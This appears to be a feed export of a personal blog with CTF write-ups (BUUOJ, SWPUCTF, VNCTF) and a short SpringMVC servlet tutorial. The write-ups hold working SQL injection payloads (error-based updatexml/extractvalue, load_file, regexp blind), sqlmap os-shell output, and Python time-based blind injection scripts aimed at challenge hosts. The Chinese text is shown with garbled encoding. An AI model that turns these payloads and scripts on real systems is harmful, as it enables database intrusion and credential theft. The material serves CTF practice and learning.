&#39;~hzufuhzuf&#39;</span><br><span class="line">mysql&gt;  select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(reverse((group_concat(STNAME))))from student)),0x7e)));</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºMarkdownè‡ªåŠ¨çš„å¼±æ™ºä¸å…¨ï¼Œå¯¼è‡´æˆ‘fuzzäº†å·¨ä»–å¦ˆä¹…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">admin&quot;||(updatexml(1,concat(0x3a,(select(reverse(group_concat(real_flag_1s_here)))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))#</span><br></pre></td></tr></table></figure>

<p><img src="image-20201118221117122.png" alt="image-20201118221117122"></p>
<p>å¾—åˆ°flagï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;8091937b-0547-42a3-b7b3-415a267a6a46&#125;</span><br></pre></td></tr></table></figure>



<h1 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h1><p>è¿™é“é¢˜çš„ä¸éš¾ï¼Œå°±æ˜¯å‡ºé¢˜äººæ¯”è¾ƒé™©æ¶ï¼Œè®©ä½ éœ€è¦æµ‹è¯•å¾ˆä¹…ï¼Œè¿‡æ»¤çš„ä¸œè¥¿ï¼Œä¹Ÿå¾ˆå¤šï¼Œä½†æ˜¯è‡ªå·±è¿˜æ˜¯å­¦åˆ°å¾ˆå¤šä¸œè¥¿çš„ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹regexpï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">https://dev.mysql.com/doc/refman/5.7/en/regexp.html#operator_regexp</span><br></pre></td></tr></table></figure>

<p>å®˜æ–¹å…è®¸ç”¨æˆ·æŸ¥è¯¢çš„æ—¶å€™ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥è¿”å›æ»¡è¶³çš„ç»“æœï¼Œè‹¥æˆ‘ä»¬å¯¹ä¸€ä¸²å­—ç¬¦ä¸²è¿›è¡ŒæŸ¥è¯¢ï¼Œè‹¥æŸ¥è¯¢æˆåŠŸï¼Œåˆ™ä¼šè¿”å›1ï¼Œå¦åˆ™å°±æ˜¯0</p>
<p><img src="image-20201119122114553.png" alt="image-20201119122114553"></p>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œè‹¥æˆ‘ä»¬æŸ¥è¯¢çš„æ˜¯ä¸€ä¸ªç»“æœé›†ï¼Œåˆ™ä¼šè¿”å›åŒ¹é…çš„ç›¸åº”æ•°æ®ï¼š</p>
<p><img src="image-20201119122203777.png" alt="image-20201119122203777"></p>
<p>æ€»ç»“ä¸‹æ¥æŸ¥è¯¢çš„ç»“æœå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select [å†…å®¹] from [è¡¨å] where [é™å®šæŸ¥è¯¢ç›®æ ‡ï¼Œåªèƒ½å»åŒ¹é…ä¸€ä¸ªå­—æ®µçš„ç›®æ ‡] REGEXP [&#39;æ­£åˆ™è¡¨è¾¾å¼&#39;];</span><br><span class="line">#ä¾‹å­ï¼š</span><br><span class="line">SELECT * from websites where url REGEXP &#39;goo&#39;;</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆæˆ‘ä»¬çš„æ³¨å…¥è¯­å¥å¯ä»¥ç¼–å†™æˆï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))#</span><br></pre></td></tr></table></figure>

<p>é™¤æ­¤ä¹‹å¤–åº”è¯¥è¿˜å¯ä»¥åˆ©ç”¨è¯¥è¯­å¥è¿›è¡Œç›²æ³¨ï¼š</p>
<p>é¦–å…ˆæ„é€ ifè¯­å¥ï¼Œifè¯­å¥æ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT IF(1&gt;2,2,3);</span><br><span class="line">        -&gt; 3</span><br><span class="line">mysql&gt; SELECT IF(1&lt;2,&#39;yes&#39;,&#39;no&#39;);</span><br><span class="line">        -&gt; &#39;yes&#39;</span><br><span class="line">mysql&gt; SELECT IF(STRCMP(&#39;test&#39;,&#39;test1&#39;),&#39;no&#39;,&#39;yes&#39;);</span><br><span class="line">        -&gt; &#39;no&#39;</span><br><span class="line">#é‚£ä¹ˆæ ¼å¼å¦‚ä¸‹ï¼š</span><br><span class="line">if([åˆ¤æ–­è¡¨è¾¾å¼],[æˆåŠŸçš„ç»“æœ],[å¤±è´¥çš„ç»“æœ]);</span><br></pre></td></tr></table></figure>

<p>æ³¨å…¥ä¸­é€šå¸¸ä½¿ç”¨ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; select * from websites where id &#x3D;&#39;1&#39; and if( (1&#x3D;1),0,1);</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from websites where id &#x3D;&#39;1&#39; and if( (1&#x3D;1),1,0);</span><br><span class="line">+----+--------+------------------------+-------+---------+</span><br><span class="line">| id | name   | url                    | alexa | country |</span><br><span class="line">+----+--------+------------------------+-------+---------+</span><br><span class="line">|  1 | Google | https:&#x2F;&#x2F;www.google.cm&#x2F; |     1 | USA     |</span><br><span class="line">+----+--------+------------------------+-------+---------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">#é€»è¾‘ç¬¦å·ï¼š</span><br><span class="line">#&amp;&amp; ä¸º andï¼Œ^ ä¸ºxorï¼Œ||ä¸ºæˆ–</span><br></pre></td></tr></table></figure>

<p>æ‹¼å‡‘å‡ºæ¥å¯ä»¥å¾—åˆ°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and 1&#x3D;(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA&#x3D;&quot;security&quot; AND table_name REGEXP &#39;^e&#39; LIMIT 0,1) </span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œé¡ºä¾¿è®°å½•ä¸€ä¸‹load_fileçš„æŠ¥é”™æ³¨å…¥ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">search.php?keywords=&#x27;and extractvalue(0x7e,concat(0x7e,(mid((<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">&#x27;ar/wwwml/flag.php&#x27;</span>)),<span class="number">60</span>,<span class="number">80</span>))))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>



<p>æ–‡ç« ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freesion.com&#x2F;article&#x2F;2367234678&#x2F;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>SQLæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>RoacCTFOnlineProxy</title>
    <url>/2020/11/26/RoacCTFOnlineProxy/</url>
    <content><![CDATA[]]></content>
      <tags>
        <tag>BUU</tag>
      </tags>
  </entry>
  <entry>
    <title>SWPUCTF</title>
    <url>/2020/12/06/SWPUCTF/</url>
    <content><![CDATA[<h1 id="ç¬¬ä¸€æ­¥"><a href="#ç¬¬ä¸€æ­¥" class="headerlink" title="ç¬¬ä¸€æ­¥"></a>ç¬¬ä¸€æ­¥</h1><p>é€šè¿‡æ‰«ç›®å½•èƒ½å¤Ÿå¾—åˆ°Index.php.bak,å¾—å‡ºå¦‚ä¸‹ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">GET /important_index_its_so_long_right.php?id=1 HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™ä¸ªurlä¸‹é¢å¯ä»¥è¿›è¡Œæ³¨å…¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;182.150.46.187:8802&#x2F;important_index_its_so_long_right.php?id&#x3D;1</span><br></pre></td></tr></table></figure>

<p>æ‰«å‡ºæ¥å¯†ç ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">+----------------------------------+----------+------+</span><br><span class="line">| pwd                              | usn      | id   |</span><br><span class="line">+----------------------------------+----------+------+</span><br><span class="line">| f1097380e513e86f2c1548cc1094bf4e | admin123 | 1    |</span><br><span class="line">+----------------------------------+----------+------+</span><br></pre></td></tr></table></figure>

<p>somd5è§£å¯†å¯ä»¥å¾—å‡ºï¼šwllm@123ï¼Œè¿™ä¸ªå¯ä»¥ç™»é™†åå°ï¼Œh1ntæˆ‘ä»¬ä¹Ÿå¯ä»¥å»æ³¨å…¥å‡ºæ¥ä¸œè¥¿</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">+------+--------------------------------------+--------+</span><br><span class="line">| id   | hint                                 | user   |</span><br><span class="line">+------+--------------------------------------+--------+</span><br><span class="line">| 1    | last_index_come_on_swpu_ctf.php?id=4 | 00001  |</span><br><span class="line">+------+--------------------------------------+--------+</span><br></pre></td></tr></table></figure>

<p>ç™»é™†åå°ï¼š</p>
<p>æºç ä¸­å¯ä»¥çœ‹è§ï¼šwriteuser_00001_log.log</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyMToyMToxNi9pcDoxMjcuMC4wLjEvdmlldzp3aWZlLmh0bWw=</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyMToyMToyMC9pcDoxMjcuMC4wLjEvdmlldzpkYXFpLmh0bWw=</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyMToyMjozMy9pcDoxMjcuMC4wLjEvdmlldzpqaWF5b3UuaHRtbA==</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyMToyNToxNi9pcDoxMjcuMC4wLjEvdmlldzphZG1pbmlzdHJhdG9yLmh0bWw=</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyMToyOToxNi9pcDoxMjcuMC4wLjEvdmlldzpkYXFpLmh0bWw=</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyMjoyMToxNi9pcDoxMjcuMC4wLjEvdmlldzptZW8ucGhw</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyMzoyMToxNi9pcDoxMjcuMC4wLjEvdmlldzptZXNzLnBocA==</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyNDoyMzoxNC9pcDoxMjcuMC4wLjEvdmlldzplY3kucGhw</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyNjoyMTozMy9pcDoxMjcuMC4wLjEvdmlldzpob21lLnBocA==</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyNzoyMTo1Ni9pcDoxMjcuMC4wLjEvdmlldzppbmRleC5waHA=</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyNzoyMzoxNi9pcDoxMjcuMC4wLjEvdmlldzp1cF9sb19hZF9hZF9taW4ucGhw</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyODoyMjoyNi9pcDoxMjcuMC4wLjEvdmlldzptZXNzLnBocA==</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyODoyNToyNi9pcDoxMjcuMC4wLjEvdmlldzo0MDQuaHRtbA==</span><br><span class="line">L3VzZXI6MDAwMDEvdGltZToxMDoyOToxOToxNi9pcDoxMjcuMC4wLjEvdmlldzphZG1pbi5waHA=</span><br></pre></td></tr></table></figure>

<p>å…¨éƒ¨è§£å¯†å‡ºæ¥ï¼Œup_lo_ad_ad_min.phpï¼š</p>
<p>è®¿é—®ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">éæ³•æ–‡ä»¶ç±»å‹</span><br><span class="line">è¯·å…ˆå»up_lo_ad_er_security.phpè¿›è¡Œç™»å½•</span><br></pre></td></tr></table></figure>

<p>ç”¨user 00001å»ç™»é™†ï¼Œå‘ç°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„ç‚¹ï¼Œç»“åˆä¹‹å‰çš„sqlæ³¨å…¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨è¿™é‡Œå†™shellè¿›å»è·å–æƒé™</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">45948ä¸Šä¼ æ–‡ä»¶å: 1 (2).jpg</span><br><span class="line">æ–‡ä»¶ç±»å‹: image/jpeg</span><br><span class="line">æ–‡ä»¶å¤§å°: 44.87109375 kB</span><br><span class="line">æ–‡ä»¶ä¸´æ—¶å­˜å‚¨çš„ä½ç½®: /tmp/phpJluzIg</span><br><span class="line">æ–‡ä»¶å­˜å‚¨åœ¨: upl_oad_pat_h/1 (2).jpg</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å°†shellä¸Šä¼ åˆ°upl_oad_pat_hç›®å½•ä¸‹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">which web application language does the web server support?</span><br><span class="line">[1] ASP</span><br><span class="line">[2] ASPX</span><br><span class="line">[3] JSP</span><br><span class="line">[4] PHP (default)</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 4</span></span><br><span class="line">[17:30:56] [WARNING] unable to automatically retrieve the web server document root</span><br><span class="line">what do you want to use for writable directory?</span><br><span class="line">[1] common location(s) (&#x27;/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs&#x27;) (default)</span><br><span class="line">[2] custom location(s)</span><br><span class="line">[3] custom directory list file</span><br><span class="line">[4] brute force search</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">os-shell&gt;</span><span class="bash"> cat /flag</span></span><br><span class="line">do you want to retrieve the command standard output? [Y/n/a] y</span><br><span class="line">command standard output: &#x27;flag&#123;d1ddddhm_swpu_e@sy_h@ck&#125;&#x27;</span><br><span class="line"><span class="meta">os-shell&gt;</span><span class="bash"> </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>SpringMVC</title>
    <url>/2020/11/19/SpringMVC/</url>
    <content><![CDATA[<p>æ³¨å…¥äº†ä¸€å¤©çœŸçš„æ•´çš„äººéƒ½å¤´æ™•çœ¼èŠ±çš„ï¼Œå­¦ä¸€ä¸‹å¼€å‘æ”¾æ¾ä¸€ä¸‹</p>
<h1 id="SpringMVC-01"><a href="#SpringMVC-01" class="headerlink" title="SpringMVC-01"></a>SpringMVC-01</h1><p>æˆ‘ä»¬é¦–å…ˆç¬¬ä¸€æ­¥å…ˆå¤ä¹ Servletå’Œtomcat</p>
<p>æˆ‘ä»¬è€æ ·å­ï¼Œä¸‰å±‚æ¶æ„ï¼Œç„¶åå¯¼å…¥åŒ…ä»€ä¹ˆçš„</p>
<p>ç±»çš„ç»„ç»‡ï¼š</p>
<p><img src="image-20201119205548729.png" alt="image-20201119205548729"></p>
<p>æ³¨æ„è¯·åˆ›å»ºMAVENé¡¹ç›®</p>
<p>ä¹‹åæ˜¯å¯¼åŒ…ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.junit.jupiter/junit-jupiter-api --&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.junit.jupiter<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit-jupiter-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">     <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-core --&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.10.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">     <span class="comment">&lt;!-- https://mvnrepository.com/artifact/javax.servlet.jsp/javax.servlet.jsp-api --&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet.jsp-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">     <span class="comment">&lt;!-- https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api --&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å†ä¹‹åæ˜¯å†™ä»£ç ï¼š</p>
<p>HelloServletï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.gura.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"><span class="comment">//        è·å–å‰ç«¯å‚æ•°</span></span><br><span class="line">        String method =req.getParameter(<span class="string">&quot;method&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (method.equals(<span class="string">&quot;add&quot;</span>))&#123;</span><br><span class="line">            req.getSession().setAttribute(<span class="string">&quot;msg&quot;</span>,<span class="string">&quot;æ‰§è¡Œäº†æ·»åŠ æ–¹æ³•&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.equals(<span class="string">&quot;delete&quot;</span>))&#123;</span><br><span class="line">            req.getSession().setAttribute(<span class="string">&quot;msg&quot;</span>,<span class="string">&quot;æ‰§è¡Œäº†delteæ–¹æ³•&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//è°ƒç”¨ä¸šåŠ¡</span></span><br><span class="line"><span class="comment">//    è§†å›¾è½¬å‘æˆ–è€…é‡å®šå‘</span></span><br><span class="line">        req.getRequestDispatcher(<span class="string">&quot;/WEB-INF/jsp/test.jsp&quot;</span>).forward(req,resp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        doGet(req,resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>test.jsp:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: <span class="number">75620</span></span><br><span class="line">  Date: <span class="number">2020</span>/<span class="number">11</span>/<span class="number">19</span></span><br><span class="line">  Time: <span class="number">20</span>:<span class="number">46</span></span><br><span class="line">  To change <span class="keyword">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;$&#123;msg&#125;&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>web.xml:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.gura.servlet.HelloServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">session-config</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">session-timeout</span>&gt;</span>15<span class="tag">&lt;/<span class="name">session-timeout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">session-config</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå®ç°äº†ä¸€æ¬¡å¯¹æ¥å£çš„å¤„ç†çš„è½¬å‘</p>
<p>æµ‹è¯•ä»£ç æˆåŠŸ</p>
]]></content>
      <tags>
        <tag>Java</tag>
        <tag>å¼€å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>VNCTF_2021_realezjvav</title>
    <url>/2021/03/22/VNCTF-2021-realezjvav/</url>
    <content><![CDATA[<h1 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h1><p>è¿™é‡Œä¸æ˜¯æˆ‘æƒ³å­¦ä¹ çš„é‡ç‚¹ï¼Œæ•…ç›´æ¥ç”©ä¸€ä¸ªç¬›å¡å°”ç§¯çš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://73b041f1-d05e-451c-8ef9-eeda4da6ab8e.node3.buuoj.cn/user/login&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">min</span>=<span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span>=<span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        j=<span class="built_in">min</span>+(<span class="built_in">max</span>-<span class="built_in">min</span>)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> j==<span class="built_in">min</span>:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        payload=<span class="string">&quot;-1&#x27;or if(ascii(substr(password,&#123;&#125;,1))&lt;&#123;&#125;,(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.tables C),1)#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=requests.post(url=url,data=data,timeout=<span class="number">0.7</span>)</span><br><span class="line">            <span class="built_in">min</span>=j</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">max</span>=j</span><br><span class="line">        sleep(<span class="number">0.4</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æˆ–è€…è¿™ä¸ªï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82/user/login&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    f1=flag</span><br><span class="line">    top=<span class="number">127</span></span><br><span class="line">    low=<span class="number">33</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=top:</span><br><span class="line">        mid=(top+low)//<span class="number">2</span></span><br><span class="line">        <span class="comment"># 